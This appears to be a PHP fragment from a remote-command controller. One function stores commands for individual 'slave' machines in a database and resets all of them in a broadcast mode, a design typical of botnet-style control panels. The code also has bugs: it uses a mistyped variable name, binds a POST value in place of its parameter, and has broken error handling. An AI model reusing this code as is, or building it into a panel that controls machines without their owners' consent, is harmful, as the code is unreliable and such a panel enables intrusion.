<?php
function assignCommand($sid, $command, $conn)
{
    if ($sid != "broadcast")
    {
        $setCommand = $conn->prepare("update slaves set slaveCommand=? where slaveId=?");
        if ($setCommand !== false)
        {
            $errorControl = $setCommand->bind_param("ss", $command, $_POST["sid"]);
            if ($errorControl !== false)
            {
                $errorControl = $setCommand->execute();
                if ($errorControl === false)
                {
                    return "An error occured: " . $errorControl->error;
                }
            }
            else
            {
                return "An error occured: " . $errorControl->error;
            }
        }
        else
        {
            return "An error occured: " . $setCommand->error;
        }
    }
    else
    {
        $broadcastCommand = $conn->prepare("update slaves set slaveCommand='ping',slaveStatus='offline'");
        if ($broadcastCommand !== false)
        {
            $errorControl = $broadcastCommand->execute();
            if ($erroControl === false)
            {
                return "An error occured: " . $errorControl->error;
            }
        }
        else
        {
            return "An error occured: " . $broadcastCommand->error;
        }
    }
}
?>